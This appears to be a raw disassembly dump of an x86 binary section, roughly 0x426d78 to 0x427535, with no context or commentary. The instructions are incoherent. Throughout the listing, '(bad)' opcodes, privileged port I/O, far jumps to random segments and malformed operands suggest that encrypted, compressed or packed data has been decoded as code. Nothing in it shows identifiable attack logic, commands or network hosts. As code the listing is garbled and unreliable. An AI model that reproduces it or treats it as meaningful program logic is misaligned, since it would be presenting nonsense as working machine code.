  426d78:	adc    BYTE PTR [edx+0x626e73ed],dh
  426d7e:	adc    DWORD PTR [edi-0x7d78ea51],0x2c
  426d85:	test   eax,0x6cf7b533
  426d8a:	push   edi
  426d8b:	call   0x2bd3:0x1aba6cf1
  426d92:	test   al,0xf5
  426d94:	mov    edi,0xf3c6568b
  426d99:	cli    
  426d9a:	or     DWORD PTR [ecx+0x4a],0xffffff89
  426d9e:	push   ebx
  426d9f:	fisttp QWORD PTR [edi]
  426da1:	push   eax
  426da2:	push   ecx
  426da3:	in     al,dx
  426da4:	mov    ds:0x451d1aca,eax
  426da9:	popa   
  426daa:	xchg   esi,eax
  426dab:	jle    0x426d8e
  426dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dae:	mov    cl,0x57
  426db0:	cld    
  426db1:	call   0x947423df
  426db6:	cs mov bl,0x97
  426db9:	pop    ss
  426dba:	or     bl,BYTE PTR [ebx]
  426dbc:	sub    BYTE PTR [ecx+0x61],al
  426dbf:	sbb    ch,bl
  426dc1:	xor    dh,BYTE PTR [ecx]
  426dc3:	retf   
  426dc4:	and    edx,DWORD PTR [ecx]
  426dc6:	jle    0x426d57
  426dc8:	xchg   ecx,eax
  426dc9:	add    BYTE PTR [ebp-0x9],bl
  426dcc:	lahf   
  426dcd:	jmp    0x426e3d
  426dcf:	sbb    esp,DWORD PTR [ebx+0x14e4ce7e]
  426dd5:	dec    esi
  426dd6:	(bad)  
  426dd7:	je     0x426da3
  426dd9:	add    DWORD PTR [ebx+0x5c],esp
  426ddc:	mov    WORD PTR [ebp+0x3a],cs
  426ddf:	dec    ebx
  426de0:	or     al,0x57
  426de2:	cmp    DWORD PTR [eax],ebx
  426de4:	aam    0x28
  426de6:	(bad)  [edi-0x43520d75]
  426dec:	outs   dx,BYTE PTR ds:[esi]
  426ded:	ja     0x426dae
  426def:	push   esi
  426df0:	mov    cl,BYTE PTR [ecx]
  426df2:	data16 icebp 
  426df4:	mov    DWORD PTR [edx],edx
  426df6:	rol    DWORD PTR [edx+0x1651b273],0xfc
  426dfd:	retf   
  426dfe:	aad    0x2a
  426e00:	xor    al,0x5a
  426e02:	ret    0x6ded
  426e05:	adc    al,0xfe
  426e07:	mov    ah,0x8c
  426e09:	add    al,0x88
  426e0b:	call   0xfbd3:0x30ca9725
  426e12:	cs jge 0x426e03
  426e15:	std    
  426e16:	jae    0x426d9a
  426e18:	adc    ebp,DWORD PTR [edi]
  426e1a:	shl    BYTE PTR [ebp+0x1b],1
  426e1d:	jecxz  0x426dc3
  426e1f:	sti    
  426e20:	icebp  
  426e21:	test   BYTE PTR [ebx-0x70ddc553],0x2f
  426e28:	or     eax,0x3ddced68
  426e2d:	retf   
  426e2e:	cmp    BYTE PTR [edx+0x2b],ch
  426e31:	adc    bl,BYTE PTR [esi]
  426e33:	adc    BYTE PTR [eax-0x7a],bh
  426e36:	call   DWORD PTR [ebx-0x70415e8]
  426e3c:	and    edx,DWORD PTR [ecx+0x6477059]
  426e42:	mov    cl,0x8b
  426e44:	pop    esp
  426e45:	daa    
  426e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e47:	add    DWORD PTR [esi],0x4
  426e4a:	xor    ecx,esi
  426e4c:	xlat   BYTE PTR ds:[ebx]
  426e4d:	inc    edi
  426e4e:	sub    BYTE PTR fs:[eax-0x5130b76],al
  426e55:	cmp    al,0xb1
  426e57:	push   esi
  426e58:	int    0x3b
  426e5a:	int3   
  426e5b:	rcr    DWORD PTR [edx+0xe],0x67
  426e5f:	int3   
  426e60:	push   0x62e91912
  426e65:	into   
  426e66:	mov    edx,0x67e10a7c
  426e6b:	cmp    BYTE PTR [esi-0xb],ch
  426e6e:	aaa    
  426e6f:	and    ah,bh
  426e71:	ret    
  426e72:	jno    0x426ed3
  426e74:	mov    dl,0xba
  426e76:	std    
  426e77:	aad    0xa7
  426e79:	inc    edi
  426e7a:	and    al,BYTE PTR [edx+ebp*4]
  426e7d:	jle    0x426ec1
  426e7f:	call   0xa413:0xd65849ad
  426e86:	xchg   edx,eax
  426e87:	cmp    al,0xeb
  426e89:	fdiv   DWORD PTR [ebp-0x23ce5732]
  426e8f:	push   esp
  426e90:	in     al,0x25
  426e92:	rol    BYTE PTR [ebx-0x6b9c89b0],0x63
  426e99:	xchg   ebx,eax
  426e9a:	fdivr  QWORD PTR [eax]
  426e9c:	adc    DWORD PTR [ecx],esi
  426e9e:	lock sbb dh,BYTE PTR cs:[edi-0x6a]
  426ea3:	jbe    0x426f12
  426ea5:	(bad)  
  426ea6:	jb     0x426ead
  426ea8:	dec    edx
  426ea9:	cmc    
  426eaa:	or     al,0x11
  426eac:	push   edi
  426ead:	(bad)
  426eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eb2:	or     al,0xca
  426eb4:	and    eax,0x6da68955
  426eb9:	pusha  
  426eba:	push   0x5942d93c
  426ebf:	mov    ecx,0x2a901413
  426ec4:	mov    ds:0x2db03bbb,al
  426ec9:	cmp    bl,ch
  426ecb:	xor    DWORD PTR [edi*8+0x3d700783],eax
  426ed2:	mov    ah,BYTE PTR [eax-0x24]
  426ed5:	outs   dx,DWORD PTR ds:[esi]
  426ed6:	push   ebp
  426ed7:	dec    esp
  426ed8:	jmp    0xea92:0xf2f70946
  426edf:	adc    BYTE PTR [esp+edx*2],al
  426ee2:	dec    ebp
  426ee3:	fs pushf 
  426ee5:	out    dx,al
  426ee6:	fisub  WORD PTR ds:0x96938241
  426eec:	out    0x8d,al
  426eee:	scas   al,BYTE PTR es:[edi]
  426eef:	cmp    DWORD PTR [ebx+0x70],ecx
  426ef2:	and    BYTE PTR [ecx+0x2d],ch
  426ef5:	jae    0x426f4b
  426ef7:	repnz stc 
  426ef9:	sbb    BYTE PTR [eax],0xf0
  426efc:	ja     0x426f75
  426efe:	xchg   BYTE PTR [edi],al
  426f00:	sub    cl,BYTE PTR [eax+0x3a]
  426f03:	mov    eax,0x2ec05189
  426f08:	scas   eax,DWORD PTR es:[edi]
  426f09:	adc    BYTE PTR [edi+0xd8a1d59],bh
  426f0f:	xchg   edx,eax
  426f10:	test   ch,dl
  426f12:	aam    0xe7
  426f14:	aad    0xbf
  426f16:	xor    al,0x9b
  426f18:	ret    
  426f19:	leave  
  426f1a:	xlat   BYTE PTR ds:[ebx]
  426f1b:	in     eax,dx
  426f1c:	cmp    BYTE PTR [ebx-0x7991ff4e],ch
  426f22:	(bad)  
  426f23:	aad    0x8b
  426f25:	jle    0x426f59
  426f27:	arpl   bx,bx
  426f29:	and    DWORD PTR [ebx],edi
  426f2b:	mov    cl,BYTE PTR [ecx]
  426f2d:	pop    ecx
  426f2e:	fwait
  426f2f:	test   edi,ebp
  426f31:	push   esi
  426f32:	enter  0x3577,0x35
  426f36:	shl    BYTE PTR [esi-0x14],cl
  426f39:	loope  0x426fb7
  426f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f3c:	jnp    0x426f9e
  426f3e:	xchg   ecx,eax
  426f3f:	inc    ebx
  426f40:	cmp    ecx,DWORD PTR [edx-0x6f1afa10]
  426f46:	repnz or BYTE PTR [ecx],0xa7
  426f4a:	and    eax,0xe9ae3cea
  426f4f:	adc    bl,bh
  426f51:	cmp    BYTE PTR [edi-0x50],0x7
  426f55:	sub    eax,ebx
  426f57:	retf   0x2721
  426f5a:	fscale 
  426f5c:	xchg   edi,eax
  426f5d:	(bad)  
  426f5e:	(bad)  
  426f5f:	cs push ds
  426f61:	in     al,dx
  426f62:	dec    edx
  426f63:	mov    cl,0x66
  426f65:	mov    ebx,0x32406af5
  426f6a:	mov    eax,es:0xca20ce9a
  426f70:	pcmpgtb mm0,mm1
  426f73:	jge    0x426f65
  426f75:	pop    ebp
  426f76:	lahf   
  426f77:	lock fisttp DWORD PTR [eax]
  426f7a:	mov    cl,0xa3
  426f7c:	fisttp DWORD PTR [edx+0x26cc11f7]
  426f82:	xor    BYTE PTR [edx],bl
  426f84:	xchg   DWORD PTR [ebx],ecx
  426f86:	dec    ebp
  426f87:	cmp    BYTE PTR cs:[esi],dl
  426f8a:	pusha  
  426f8b:	test   dh,0x34
  426f8e:	push   eax
  426f8f:	pop    ss
  426f90:	xchg   BYTE PTR [ebx],bl
  426f92:	mov    ds:0x4d94275e,al
  426f97:	ret    0x3053
  426f9a:	cmc    
  426f9b:	(bad)  
  426f9c:	shr    BYTE PTR [ecx+0x62d15210],0x5b
  426fa3:	les    ecx,FWORD PTR [edi-0x6]
  426fa6:	push   es
  426fa7:	xlat   BYTE PTR es:[ebx]
  426fa9:	in     eax,0x41
  426fab:	cmp    eax,0xc6a7a8a4
  426fb0:	test   DWORD PTR [edi-0x7257f07a],ebp
  426fb6:	mov    ?,WORD PTR [ebx+0x22c8b52]
  426fbc:	add    DWORD PTR es:[ebx+0x1cbf4405],edx
  426fc3:	jnp    0x426f58
  426fc5:	adc    bh,BYTE PTR [eax+0x442d0799]
  426fcb:	das    
  426fcc:	xchg   ebp,eax
  426fcd:	adc    eax,0x3d2f4c2f
  426fd2:	sbb    al,BYTE PTR [ebx-0x70]
  426fd5:	jle    0x427051
  426fd7:	js     0x426ffb
  426fd9:	aas    
  426fda:	aam    0x3a
  426fdc:	push   ebp
  426fdd:	lea    esi,[edx]
  426fdf:	fs mov ah,0x9f
  426fe2:	retf   
  426fe3:	xchg   DWORD PTR [edi+0x41],esp
  426fe6:	(bad)  
  426fe7:	jmp    0x5b1a:0xfbab7875
  426fee:	sub    eax,0x3622b478
  426ff3:	push   esi
  426ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ff5:	aad    0xf2
  426ff7:	data16 mov ds:0x31ad4fa7,al
  426ffd:	mov    ds:0x27442d87,al
  427002:	and    al,0x6c
  427004:	pop    ebp
  427005:	mov    ecx,0xa050975b
  42700a:	and    BYTE PTR [eax-0x699c2c18],ah
  427010:	cdq    
  427011:	fldenv [eax+0x13]
	...
  427020:	add    BYTE PTR [ebx],bl
  427022:	inc    ebp
  427023:	gs ret 
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	rcl    BYTE PTR [ebx+0x30],cl
  42702f:	or     esp,DWORD PTR [edi+0x22]
  427032:	out    0x1,al
  427034:	add    BYTE PTR [ebx-0x12fffffd],ch
  42703a:	dec    edx
  42703b:	ror    BYTE PTR [esi+0x60],cl
  42703e:	retf   0x9157
  427041:	bound  ebx,QWORD PTR [ecx+0x1983a9ab]
  427047:	xchg   esp,eax
  427048:	inc    edx
  427049:	xor    BYTE PTR [eax],bh
  42704b:	pop    esi
  42704c:	fadd   DWORD PTR [ebp-0x3d]
  42704f:	test   DWORD PTR ds:0x9fa5551a,esi
  427055:	mov    ecx,0x59c8456
  42705a:	push   ss
  42705b:	push   ss
  42705c:	and    dh,BYTE PTR [ebx+0x2]
  42705f:	cdq    
  427060:	add    ah,0x4f
  427063:	inc    ecx
  427064:	pop    ds
  427065:	(bad)  
  427066:	in     al,0xfc
  427068:	fcmovnbe st,st(0)
  42706a:	sub    eax,0xa101fddf
  42706f:	sbb    ch,BYTE PTR [ebx+0x6ec67cb0]
  427075:	hlt    
  427076:	jmp    0x4270b7
  427078:	xchg   esi,eax
  427079:	xrelease xchg DWORD PTR ds:[eax-0x79],eax
  42707e:	ins    BYTE PTR es:[edi],dx
  42707f:	out    0x86,eax
  427081:	ins    DWORD PTR es:[edi],dx
  427082:	in     eax,0x70
  427084:	xchg   BYTE PTR [edi+0x76c49a73],cl
  42708a:	popa   
  42708b:	stc    
  42708c:	adc    al,0x61
  42708e:	aas    
  42708f:	jns    0x427011
  427091:	test   BYTE PTR [ebx-0x72],0x23
  427095:	cmc    
  427096:	mov    bh,0xde
  427098:	cli    
  427099:	out    0x87,eax
  42709b:	push   ss
  42709c:	stos   DWORD PTR es:[edi],eax
  42709d:	push   0x52
  42709f:	aad    0xf9
  4270a1:	inc    esp
  4270a2:	jmp    0x9647813e
  4270a7:	leave  
  4270a8:	cmp    BYTE PTR [eax+0x79a05307],0xc1
  4270af:	push   ds
  4270b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b1:	stos   BYTE PTR es:[edi],al
  4270b2:	cmc    
  4270b3:	rcl    BYTE PTR [esp+eax*1+0x620fa16f],1
  4270ba:	pop    es
  4270bb:	mov    ds:0xf8cb59d0,al
  4270c0:	xchg   DWORD PTR [eax],ebp
  4270c2:	fs push 0xd0cec9fa
  4270c8:	push   0x5c16f499
  4270cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270ce:	in     al,dx
  4270cf:	push   ebx
  4270d0:	loope  0x427089
  4270d2:	iret   
  4270d3:	arpl   WORD PTR [eax+0x9],sp
  4270d6:	or     cl,BYTE PTR [ebx]
  4270d8:	sub    BYTE PTR [esi+0x7f],al
  4270db:	(bad)  
  4270dc:	ins    DWORD PTR es:[edi],dx
  4270dd:	push   eax
  4270de:	lds    ebx,FWORD PTR [eax+0x3f6129e8]
  4270e4:	jecxz  0x42707a
  4270e6:	iret   
  4270e7:	pop    ds
  4270e8:	xchg   DWORD PTR [ebp-0x7ee30bd9],ebp
  4270ee:	push   ds
  4270ef:	mov    WORD PTR [ebx],?
  4270f1:	out    dx,al
  4270f2:	pop    ds
  4270f3:	adc    al,0xe1
  4270f5:	mov    bh,BYTE PTR [edx-0x4e7d898c]
  4270fb:	inc    ebp
  4270fc:	pop    edi
  4270fd:	popf   
  4270fe:	pop    edi
  4270ff:	cld    
  427100:	rcr    DWORD PTR [ecx+0x3250f75c],cl
  427106:	std    
  427107:	ret    
  427108:	out    dx,al
  427109:	pushf  
  42710a:	cmp    BYTE PTR ds:0xcc914212,al
  427110:	and    DWORD PTR [esi],0xffffffa5
  427113:	mov    eax,ds:0x6b2793bc
  427118:	sahf   
  427119:	push   eax
  42711a:	loop   0x42712f
  42711c:	dec    ebp
  42711d:	mov    DWORD PTR [esi],edx
  42711f:	push   edx
  427120:	cmp    BYTE PTR [eax-0x12],cl
  427123:	inc    esp
  427124:	cld    
  427125:	cld    
  427126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427127:	inc    eax
  427128:	push   ecx
  427129:	shr    DWORD PTR [esi],1
  42712b:	addr16 mov ch,0x1
  42712e:	xchg   ebp,eax
  42712f:	cs dec eax
  427131:	and    al,0x1c
  427133:	push   esp
  427134:	mov    ah,0xd9
  427136:	sar    ch,cl
  427138:	mov    edi,0x96215ae7
  42713d:	xchg   esi,eax
  42713e:	push   ebx
  42713f:	xor    ebx,ecx
  427141:	(bad)  
  427142:	popf   
  427143:	shr    ah,1
  427145:	mov    ch,0xf6
  427147:	int3   
  427148:	jle    0x42714b
  42714a:	ins    BYTE PTR es:[edi],dx
  42714b:	in     al,0xcd
  42714d:	sub    ebp,DWORD PTR [ecx+0x6d998b7c]
  427153:	pusha  
  427154:	imul   BYTE PTR [esi]
  427156:	pop    ds
  427157:	mov    esi,0x79518fae
  42715c:	xor    eax,0x64d58eca
  427161:	imul   ebp,esp,0x20dc4f5e
  427167:	mov    WORD PTR [ebx-0x23],gs
  42716a:	xchg   ebx,eax
  42716b:	push   es
  42716c:	pop    ecx
  42716d:	nop
  42716e:	ins    BYTE PTR es:[edi],dx
  42716f:	fwait
  427170:	aaa    
  427171:	xor    BYTE PTR [edx],bl
  427173:	push   cs
  427174:	cwde   
  427175:	aaa    
  427176:	dec    ebp
  427177:	aas    
  427178:	imul   eax,DWORD PTR [esi-0x46],0xffffff92
  42717c:	pop    esp
  42717d:	data16 sbb al,0xcf
  427180:	add    DWORD PTR [esi+0x66],0x17e396fd
  427187:	test   bl,al
  427189:	jbe    0x42716e
  42718b:	mov    ds,ebp
  42718d:	ins    BYTE PTR es:[edi],dx
  42718e:	das    
  42718f:	mov    bh,0x3c
  427191:	mov    ebx,ebx
  427193:	push   ebp
  427194:	or     dl,BYTE PTR [edx-0x2a]
  427197:	loopne 0x4271c9
  427199:	and    edi,0x6078c5c4
  42719f:	dec    ebp
  4271a0:	cmp    eax,DWORD PTR [edx-0x70]
  4271a3:	adc    eax,0x911a2a9c
  4271a8:	xchg   edi,eax
  4271a9:	mov    ecx,0x534bfead
  4271ae:	adc    DWORD PTR [ebx+edx*8-0x6bad5ab3],esi
  4271b5:	xchg   esp,eax
  4271b6:	cdq    
  4271b7:	fdivr  DWORD PTR [eax-0x14d32f76]
  4271bd:	sbb    dl,bh
  4271bf:	xchg   esi,eax
  4271c0:	lea    eax,[ebx]
  4271c2:	sti    
  4271c3:	test   DWORD PTR [ebx+0x34],edx
  4271c6:	and    ebp,DWORD PTR [esi-0x14e563da]
  4271cc:	add    esi,DWORD PTR [edi-0x3e]
  4271cf:	xchg   ebx,eax
  4271d0:	loop   0x42717a
  4271d2:	call   0xddc21438
  4271d7:	jae    0x427217
  4271d9:	xchg   ecx,eax
  4271da:	mov    eax,ds:0x4bbf3912
  4271df:	inc    ecx
  4271e0:	pop    ebx
  4271e1:	ss sub al,0x81
  4271e4:	jns    0x4271fa
  4271e6:	pop    es
  4271e7:	mov    bh,0x26
  4271e9:	in     eax,0x67
  4271eb:	rol    DWORD PTR [ecx+ecx*4-0x44],0x1a
  4271f0:	aaa    
  4271f1:	loopne 0x42719c
  4271f3:	shl    DWORD PTR [ebx-0x127c0a00],cl
  4271f9:	cmp    dh,BYTE PTR [ebx+0x3326ce01]
  4271ff:	pushf  
  427200:	push   esi
  427201:	shl    BYTE PTR [edi],1
  427203:	jg     0x427284
  427205:	scas   eax,DWORD PTR es:[edi]
  427206:	int3   
  427207:	(bad)  
  427208:	fsubr  QWORD PTR [ebp+edi*4+0x7db53df7]
  42720f:	fstp   TBYTE PTR [eax-0x6]
  427212:	call   0x9cc27fb1
  427217:	out    0x36,al
  427219:	icebp  
  42721a:	ja     0x42721f
  42721c:	gs mov edi,0x7e09fa11
  427222:	mov    dl,0xce
  427224:	cmp    al,0xbf
  427226:	sbb    DWORD PTR [esi-0x3a98a18f],eax
  42722c:	(bad)
  427230:	add    BYTE PTR [edx+ecx*4+0x74],ch
  427234:	pusha  
  427235:	sub    ch,dh
  427237:	dec    edx
  427238:	sub    cl,BYTE PTR [ecx-0x6e]
  42723b:	sub    al,0xa7
  42723d:	mov    eax,ds:0x3dd51e80
  427242:	adc    al,0xbf
  427244:	int3   
  427245:	sub    DWORD PTR [esi],ecx
  427247:	mov    al,0xd5
  427249:	in     eax,dx
  42724a:	popf   
  42724b:	pop    es
  42724c:	fs stos BYTE PTR es:[edi],al
  42724e:	adc    al,0xdd
  427250:	xor    al,0x3e
  427252:	test   eax,0x48908353
  427257:	fst    QWORD PTR [ecx-0x4d]
  42725a:	scas   al,BYTE PTR es:[edi]
  42725b:	imul   edx,DWORD PTR [edx-0x62],0x9a5deb3b
  427262:	and    BYTE PTR [ebp-0x15c5ea3f],0x6a
  427269:	add    DWORD PTR [edx-0x6b],ebp
  42726c:	dec    esp
  42726d:	xchg   esp,eax
  42726e:	cmc    
  42726f:	xor    esp,DWORD PTR [ebx]
  427271:	push   ebp
  427272:	das    
  427273:	dec    esp
  427274:	and    BYTE PTR [edx+0x113c18a4],0xab
  42727b:	into   
  42727c:	mov    edx,0x6f6335de
  427281:	or     eax,0x7875e9fa
  427286:	shr    BYTE PTR [edx+0x33],0xa3
  42728a:	dec    edi
  42728b:	das    
  42728c:	and    DWORD PTR [esi+0x5b83cc50],ecx
  427292:	mov    DWORD PTR [eax],0x706e5da
  427298:	sub    bh,ch
  42729a:	mov    eax,ds:0xc0cfbeaa
  42729f:	or     al,0x43
  4272a1:	pop    ds
  4272a2:	je     0x4272fb
  4272a4:	aaa    
  4272a5:	mov    fs,esp
  4272a7:	pop    ds
  4272a8:	push   ecx
  4272a9:	pop    edi
  4272aa:	fdiv   st(4),st
  4272ac:	adc    BYTE PTR [eax],dl
  4272ae:	arpl   ax,dx
  4272b0:	sub    BYTE PTR ss:0x9fe508d4,ch
  4272b7:	pushf  
  4272b8:	jmp    0xc1a97939
  4272bd:	inc    ebp
  4272be:	jne    0x4272f8
  4272c0:	cs dec esp
  4272c2:	xchg   bh,dh
  4272c4:	jb     0x4272b7
  4272c6:	pop    ebp
  4272c7:	bound  edi,QWORD PTR [edi+ebp*4]
  4272ca:	ins    DWORD PTR es:[edi],dx
  4272cb:	jns    0x42733a
  4272cd:	lahf   
  4272ce:	cmp    eax,0xbdcb4908
  4272d4:	enter  0xf5ed,0xc
  4272d8:	mov    eax,0x87ba3c3f
  4272dd:	addr16 xchg ebp,eax
  4272df:	mov    al,0xd2
  4272e1:	sbb    eax,0x6d222c8f
  4272e6:	adc    BYTE PTR [esi-0x4a6b44ad],ah
  4272ec:	cmc    
  4272ed:	dec    edi
  4272ee:	inc    edx
  4272ef:	lods   eax,DWORD PTR ds:[esi]
  4272f0:	xchg   ebx,eax
  4272f1:	mov    edi,0x2777e696
  4272f6:	leave  
  4272f7:	inc    esp
  4272f8:	mov    cl,0x8e
  4272fa:	aam    0x56
  4272fc:	sahf   
  4272fd:	push   edx
  4272fe:	and    bh,0xd6
  427301:	repnz in al,0xde
  427304:	push   cs
  427305:	jae    0x427356
  427307:	xchg   esp,eax
  427308:	xlat   BYTE PTR ds:[ebx]
  427309:	fcom   QWORD PTR ds:0x6c9b54bb
  42730f:	popa   
  427310:	sbb    esi,DWORD PTR [esi-0xb]
  427313:	adc    bl,0xab
  427316:	add    DWORD PTR ds:0x63330f38,ecx
  42731c:	not    DWORD PTR [ebx]
  42731e:	add    BYTE PTR [ecx+0x3bcaeb99],0x9e
  427325:	cmp    edx,DWORD PTR gs:[ebp+0x2e]
  427329:	mov    ds:0xf825c6cb,al
  42732e:	push   ecx
  42732f:	or     BYTE PTR [ebx-0x30fc52ed],dh
  427335:	pop    ebx
  427336:	sti    
  427337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427338:	je     0x4273ab
  42733a:	jle    0x427301
  42733c:	xor    BYTE PTR [ebp-0x70],bh
  42733f:	fild   QWORD PTR [ebp+0x62]
  427342:	pushf  
  427343:	pop    esp
  427344:	xor    al,0xc9
  427346:	inc    ebp
  427347:	pop    es
  427348:	js     0x42738c
  42734a:	pop    ss
  42734b:	or     dl,BYTE PTR [esi-0x5]
  42734e:	ja     0x42732a
  427350:	xlat   BYTE PTR ds:[ebx]
  427351:	sub    eax,0x3208a95a
  427356:	cdq    
  427357:	cmp    ecx,DWORD PTR [ebx+ebx*2]
  42735a:	pop    esp
  42735b:	xchg   esp,eax
  42735c:	xor    edi,DWORD PTR [edi+eiz*8]
  42735f:	add    eax,0x43b4b5ec
  427364:	icebp  
  427365:	fdivr  st(2),st
  427367:	test   DWORD PTR [ecx-0x5f8ee4da],0xb7d939db
  427371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427372:	xor    BYTE PTR [edx-0x29],0x20
  427376:	in     eax,0xe8
  427378:	sti    
  427379:	retf   
  42737a:	add    bl,dh
  42737c:	leave  
  42737d:	push   ds
  42737e:	mov    cl,0x97
  427380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427381:	mov    esp,0x427b6c65
  427386:	popa   
  427387:	jmp    0x8c38b6d5
  42738c:	shr    BYTE PTR [edx+0xe],1
  42738f:	sbb    al,BYTE PTR [ecx]
  427391:	xchg   ebx,eax
  427392:	cli    
  427393:	fisubr DWORD PTR [esi+0x68]
  427396:	iret   
  427397:	lds    ebp,FWORD PTR [edx]
  427399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42739a:	ficom  WORD PTR [edx+edi*1-0xd]
  42739e:	stos   BYTE PTR es:[edi],al
  42739f:	iret   
  4273a0:	mov    eax,ds:0xb04b5772
  4273a5:	or     BYTE PTR [esi+0x6d993e35],dh
  4273ab:	call   0x5402:0x7f5d1066
  4273b2:	adc    ebp,DWORD PTR [ebp+0x7909c91d]
  4273b8:	outs   dx,BYTE PTR ds:[esi]
  4273b9:	bound  esi,QWORD PTR [edi+eax*2-0x38]
  4273bd:	mov    esp,0xda5152d5
  4273c2:	and    ecx,DWORD PTR [edi-0x74]
  4273c5:	cmp    al,0xc5
  4273c7:	out    dx,eax
  4273c8:	and    al,BYTE PTR [ebp-0x76e4af36]
  4273ce:	or     al,0x8
  4273d0:	mov    bl,BYTE PTR [edi]
  4273d2:	sub    dl,BYTE PTR [edi-0x33b39065]
  4273d8:	dec    edx
  4273d9:	jmp    0xb66d0a62
  4273de:	push   ds
  4273df:	imul   ebx,DWORD PTR ds:[edi-0x19],0xffffffab
	...
  4273f0:	add    BYTE PTR [edi+eax*2],cl
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0x4b19f609
  4273fe:	mov    eax,0xe9cd87fc
  427403:	add    DWORD PTR [eax],eax
  427405:	stos   DWORD PTR es:[edi],eax
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    al,bh
  42740a:	out    dx,eax
  42740b:	push   edx
  42740c:	mov    edi,0xd8955a21
  427411:	adc    eax,0x8221c09d
  427416:	xor    al,0xc5
  427418:	in     al,0x48
  42741a:	push   ss
  42741b:	xor    al,0x1e
  42741d:	pop    edx
  42741e:	push   cs
  42741f:	dec    esi
  427420:	loop   0x427475
  427422:	out    0x7d,al
  427424:	lea    esp,[edx-0x4e8e594]
  42742a:	int3   
  42742b:	loopne 0x4273e4
  42742d:	add    dh,bh
  42742f:	cld    
  427430:	and    edx,DWORD PTR [esi+ebp*2+0x57d8893a]
  427437:	stc    
  427438:	add    BYTE PTR [ebp-0x12],al
  42743b:	cld    
  42743c:	sar    BYTE PTR [edi+0x37d4da41],cl
  427442:	jae    0x427432
  427444:	fs pop ds
  427446:	mov    esp,0x944b5d9e
  42744b:	outs   dx,BYTE PTR ds:[esi]
  42744c:	fcom   QWORD PTR [edx]
  42744e:	dec    esp
  42744f:	and    al,0x65
  427451:	xchg   edi,eax
  427452:	mov    al,0x99
  427454:	mov    bl,0xed
  427456:	fistp  DWORD PTR [esi+0x29b070f0]
  42745c:	leave  
  42745d:	mov    esi,ds
  42745f:	js     0x4274d1
  427461:	in     al,dx
  427462:	in     al,dx
  427463:	int3   
  427464:	aaa    
  427465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427466:	out    dx,eax
  427467:	in     al,0x64
  427469:	ins    DWORD PTR es:[edi],dx
  42746a:	or     BYTE PTR [ecx],0x71
  42746d:	hlt    
  42746e:	xor    eax,0xfc93776f
  427473:	out    0x7f,eax
  427475:	add    DWORD PTR [edi],ecx
  427477:	pushf  
  427478:	loopne 0x427458
  42747a:	push   edx
  42747b:	cdq    
  42747c:	sti    
  42747d:	mov    WORD PTR [esi],es
  42747f:	add    ch,BYTE PTR [ebp-0x38]
  427482:	imul   esp,DWORD PTR [ecx-0x65],0xfffffffc
  427486:	adc    DWORD PTR [si-0x48],ebx
  42748a:	div    DWORD PTR [ebx]
  42748c:	mov    ebp,0x5847e21a
  427491:	ficom  WORD PTR [edx-0x43]
  427494:	adc    dl,bl
  427496:	popa   
  427497:	iret   
  427498:	arpl   WORD PTR [esi-0x12],sp
  42749b:	cld    
  42749c:	aaa    
  42749d:	pop    ss
  42749e:	retf   
  42749f:	xchg   ebx,eax
  4274a0:	bound  ebx,QWORD PTR [ebx]
  4274a2:	rol    edx,cl
  4274a4:	jmp    0xb21f:0xb9262389
  4274ab:	pusha  
  4274ac:	loop   0x4274c0
  4274ae:	lods   eax,DWORD PTR ds:[esi]
  4274af:	ja     0x4274fb
  4274b1:	and    BYTE PTR [edi+0x142ed8e0],al
  4274b7:	in     al,0xe1
  4274b9:	stos   BYTE PTR es:[edi],al
  4274ba:	sbb    esi,DWORD PTR ds:0x36843559
  4274c0:	stc    
  4274c1:	mov    BYTE PTR [ebx+0x13],al
  4274c4:	pop    ss
  4274c5:	stos   BYTE PTR es:[edi],al
  4274c6:	pop    eax
  4274c7:	jecxz  0x42746f
  4274c9:	push   ebp
  4274ca:	imul   ecx,edx,0xa05a1474
  4274d0:	dec    esp
  4274d1:	sbb    DWORD PTR [ebx-0x49],ebp
  4274d4:	scas   al,BYTE PTR es:[edi]
  4274d5:	sub    dl,BYTE PTR [ecx+0x48]
  4274d8:	jae    0x42748a
  4274da:	fisub  DWORD PTR [ecx+0x39c772fe]
  4274e0:	adc    eax,0x7c3527ab
  4274e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274e6:	cmp    al,ah
  4274e8:	push   ds
  4274e9:	arpl   WORD PTR [eax+esi*2-0x3700d4d7],dx
  4274f0:	imul   ebx,DWORD PTR [edi-0x1c1f16c2],0x51a7f02c
  4274fa:	out    dx,eax
  4274fb:	jnp    0x427541
  4274fd:	ins    BYTE PTR es:[edi],dx
  4274fe:	dec    ecx
  4274ff:	pop    edx
  427500:	stc    
  427501:	xor    DWORD PTR [esi+0x4d],0xc96eefb5
  427508:	gs sub ch,bh
  42750b:	xlat   BYTE PTR ds:[ebx]
  42750c:	iret   
  42750d:	xchg   cl,ch
  42750f:	gs test BYTE PTR gs:[ecx-0x7e],al
  427514:	push   ebx
  427515:	(bad)
  427518:	dec    esp
  427519:	repz sti 
  42751b:	xchg   ebx,eax
  42751c:	les    ebx,FWORD PTR [ebp-0x5d478780]
  427522:	dec    ebp
  427523:	scas   eax,DWORD PTR es:[edi]
  427524:	dec    esp
  427525:	stc    
  427526:	pop    esi
  427527:	and    al,0x1e
  427529:	mov    BYTE PTR [edx+0x64],dh
  42752c:	aad    0x63
  42752e:	pop    edx
  42752f:	or     BYTE PTR [edi-0x20],bl
  427532:	push   eax
  427533:	aaa    
  427534:	inc    esi
  427535:	pushf  
